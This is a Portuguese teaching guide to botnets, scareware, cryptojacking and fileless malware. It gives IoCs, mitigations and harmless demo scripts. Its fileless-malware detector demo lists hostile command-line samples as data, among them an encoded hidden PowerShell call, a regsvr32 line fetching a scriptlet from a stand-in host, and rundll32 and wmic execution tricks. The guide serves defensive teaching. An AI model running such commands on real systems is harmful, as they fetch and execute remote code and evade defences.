# 🔹 Outros Tipos de Ameaças

---

## 1) 🕸️ Botnets

### O que são
Redes de dispositivos **infectados e controlados remotamente** (bots/zumbis) por um operador (*botmaster*). Servem para **DDoS**, envio de **spam**, **distribuição de malware** e **mineração**.

### Como funciona (alto nível)
- **Infecção** inicial (phishing, serviço exposto, IoT com senha padrão).
- **Registro** no C2 (Command & Control) para receber ordens.
- **Campanhas** coordenadas (ex.: DDoS, spam, “baixe este payload”).
- **Rotação** de infraestrutura (domínios/endereços trocados para evasão).

### IoCs
- Muitos hosts fazendo **conexões periódicas (beaconing)** a domínios **recém-registrados**.
- **Tráfego volumétrico** para um destino único (padrão de DDoS).
- **Processos idênticos** abrindo conexões de saída em massa.
- **Dispositivos IoT** com tráfego anômalo fora do perfil.

### Mitigação & Resposta
- **Atualizar IoT**, trocar **senhas padrão**, desabilitar serviços desnecessários.
- **Segmentar a rede** (IoT isolado), **deny-by-default** para saídas sensíveis.
- **EDR/IDS/IPS** com detecção de beaconing; **DNS sinkhole**/bloqueio de domínios novos.
- **Contenção rápida** (isolar host), **rotacionar credenciais/tokens** e limpar persistências.

### Demos

**A) “Mini-botnet” offline (impressões, sem rede)**  
Salve como `botnet_sim.py`:
```python
# DEMO segura: simula 5 "bots" reportando-se a um C2 fictício (sem rede).
import time, random, uuid, datetime
C2 = "c2.simulado.local"
bots = [str(uuid.uuid4())[:8] for _ in range(5)]
print(f"[start] C2={C2} bots={bots}")

for tick in range(6):
    ts = datetime.datetime.now().isoformat(timespec="seconds")
    for b in bots:
        print(f"[{ts}] bot={b} -> C2={C2} status=ok (simulado)")
    if tick == 3:
        cmd = "MOSTRAR_BANNER"  # "ordem" didática
        print(f"[{ts}] C2 broadcast: {cmd}")
        for b in bots:
            print(f"    bot={b} ação={cmd} resultado=feito")
    time.sleep(random.uniform(0.6, 1.0))
print("[done] Fim da simulação.")
```

Como narrar: padrão de beaconing e execução de “comando” centralizado — sem tráfego real.

**B) Log sintético de DDoS (para caça de IoC)**
```
2025-09-03T14:10:01 SRC=10.0.10.21 DST=203.0.113.50 DPT=443 BYTES=512
2025-09-03T14:10:01 SRC=10.0.10.22 DST=203.0.113.50 DPT=443 BYTES=520
2025-09-03T14:10:01 SRC=10.0.10.23 DST=203.0.113.50 DPT=443 BYTES=515
...
```
Exercício: alunos contam fontes distintas → mesmo destino/porta em janelas curtas ⇒ padrão de ataque volumétrico.

---

## 2) 😱 Scareware

### O que é
Software/alerta enganoso que assusta o usuário (“seu PC está infectado!”) para forçar compra/instalação de algo inútil.

### Como funciona
- Pop-ups alarmistas, telões com contagem regressiva, simulação de scan.
- Pressão psicológica para clicar/pagar.
- Pode tentar instalar PUP/Adware se o usuário “aceitar”.

### IoCs
- Pop-ups insistentes fora do site acessado.
- Ofertas “milagrosas” com gramática ruim URGÊNCIA/AMEAÇA.
- Redirecionamentos para pagamentos.

### Mitigação & Resposta
- Antivírus legítimo, navegador atualizado e bloqueio de pop-ups.
- Educação: não clicar, fechar a aba/janela, limpar extensões.
- EDR para bloquear instaladores suspeitos.

### Demo (HTML inofensivo)
Salve como `scareware_demo.html`:
```html
<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
<title>[DEMO] Scareware</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{margin:0;background:#0f0f10;color:#e9ecef;font-family:system-ui;display:grid;place-items:center;min-height:100vh}
.panel{max-width:560px;background:#1e2233;border:1px solid #2f3650;padding:28px;border-radius:16px;box-shadow:0 16px 48px rgba(0,0,0,.5)}
.warn{color:#ff6b6b;font-weight:700}.muted{color:#aeb6c8}.btn{margin-top:16px;display:inline-block;background:#ff4757;color:#fff;padding:10px 14px;border-radius:10px;font-weight:700;cursor:pointer}</style>
</head>
<body>
  <div class="panel" role="alertdialog">
    <h1 class="warn">⚠️ SEU COMPUTADOR ESTÁ INFECTADO!</h1>
    <p class="muted">Clique para “remover todos os vírus imediatamente”.</p>
    <div class="btn" id="fix">Remover agora</div>
    <p id="edu" class="muted" style="margin-top:12px;display:none"></p>
  </div>
<script>
  fix.onclick=()=>{edu.style.display='block';
    edu.textContent="DEMO: isto é scareware. Feche a aba, use antivírus confiável e não pague por 'limpezas' inesperadas.";}
</script>
</body></html>
```

---

## 3) ⛏️ Cryptojacking

### O que é
Uso indevido de CPU/GPU da vítima para minerar criptomoedas (ganho para o atacante, custo e desgaste para a vítima).

### Como funciona
- Script em site ou malware local roda “hashes” continuamente.
- Consumo elevado de CPU/GPU, aquecimento e ruído.
- Às vezes, só quando o navegador está em foco (para disfarçar).

### IoCs
- CPU/GPU alta sem motivo; fans no máximo.
- Processo de navegador consumindo muito tempo.
- Scripts de terceiros carregados de domínios estranhos.

### Mitigação & Resposta
- Bloqueadores de mineração no navegador; política de scripts de terceiros (CSP/SRI).
- Monitoramento de performance e alerts por uso anômalo.
- EDR para detectar mineradores e persistências.

### Demo (HTML com botão Iniciar/Parar)
Salve como `cryptojacking_demo.html`:
```html
<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
<title>[DEMO] Cryptojacking (simulado)</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:system-ui;background:#0c111b;color:#e7ebf3;display:grid;place-items:center;min-height:100vh}
.card{background:#141a2b;border:1px solid #26324a;border-radius:16px;padding:28px;max-width:540px}
button{border:0;border-radius:10px;padding:10px 14px;font-weight:700;cursor:pointer}
.start{background:#4f7cff;color:#fff}.stop{background:#ff5d5d;color:#fff}
progress{width:100%}.muted{color:#9fb1d1}</style></head>
<body>
<div class="card">
  <h1>Simulação de uso excessivo de CPU</h1>
  <p class="muted">Demonstra como scripts podem consumir recursos (sem minerar).</p>
  <div style="display:flex;gap:10px;margin:12px 0">
    <button class="start" id="start">Iniciar</button>
    <button class="stop" id="stop" disabled>Parar</button>
  </div>
  <p>Operações/seg (simulado): <strong id="ops">0</strong></p>
  <progress id="load" max="100" value="0"></progress>
</div>
<script>
let run=false, rid=null;
function heavy(n){let x=0;for(let i=0;i<n;i++){x=(x*1664525+1013904223)>>>0;}return x;}
function loop(){
  if(!run) return;
  const t=performance.now(); let ops=0;
  while(performance.now()-t<200){heavy(5000);ops++;}
  opsEl.textContent=String(ops); load.value=Math.min(100,20+ops);
  rid=requestAnimationFrame(loop);
}
const start=document.getElementById('start'), stop=document.getElementById('stop'), opsEl=document.getElementById('ops'), load=document.getElementById('load');
start.onclick=()=>{run=true;start.disabled=true;stop.disabled=false;loop();};
stop.onclick=()=>{run=false;cancelAnimationFrame(rid);start.disabled=false;stop.disabled=true;opsEl.textContent="0";load.value=0;};
</script>
</body></html>
```

---

## 4) 🧪 Fileless Malware

### O que é
Ataques que não gravam arquivos no disco: operam apenas na memória, abusando de ferramentas legítimas (living off the land) como PowerShell, WMI, rundll32, etc.

### Como funciona
- Script embutido/baixado na memória executa via ferramentas já presentes.
- Persistência por tarefas/agendadores/registro, sem binário novo evidente.
- Evasão: menos artefatos no disco, dificulta antivírus baseados em assinatura.

### IoCs
- Linha de comando suspeita: powershell -enc [BASE64...], wscript //e:jscript, rundll32 javascript:....
- Processos filhos atípicos (Office → PowerShell), AMSI desabilitado.
- Criação de tarefas logo após execução de script.

### Mitigação & Resposta
- EDR/XDR com foco em comportamento (criação de processos, cmdline).
- Bloqueio de macros por padrão; AMSI ativo; Constrained Language Mode.
- Privilégios mínimos, AppLocker/WDAC, PowerShell Logging e Script Block Logging.
- Resposta: isolar host, coletar eventos/detonadores, remover persistências e revisar credenciais.

### Demos

**A) Detector didático de cmdlines suspeitas (offline)**  
Salve como `fileless_detector_demo.py`:
```python
# DEMO segura: marca exemplos de linhas de comando "sinais" de fileless (não executa nada)
samples = [
  r'powershell -w hidden -enc [BASE64_PAYLOAD]',
  r'wscript.exe //e:jscript script.js',
  r'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();',
  r'regsvr32 /s /n /u /i:https://exemplo.test scrobj.dll',
  r'wmic process call create "powershell -nop -c [PAYLOAD]"',
  r'office.exe spawn -> powershell.exe -nop -w hidden'
]
rules = ['powershell','-enc','wscript','rundll32','regsvr32','wmic','office','powershell.exe']

print("Sinais (conceituais) em linhas de comando:\n")
for s in samples:
  hits = [r for r in rules if r.lower() in s.lower()]
  flag = "SUSPEITO" if hits else "OK"
  print(f"[{flag}] {s}\n   ↳ regras: {hits}")
print("\nObs.: Em EDR real, combine processo pai/filho, cmdline completa e horário.")
```
